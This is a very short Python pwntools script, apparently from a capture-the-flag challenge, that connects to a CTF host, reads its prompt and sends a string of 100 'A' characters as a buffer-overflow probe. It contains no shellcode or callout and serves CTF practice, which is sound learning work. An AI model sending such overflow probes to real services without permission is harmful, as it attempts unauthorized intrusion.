from pwn import *

r = remote('dicec.tf', 31924)

payload = "A"*100

r.recv()

r.sendline(payload)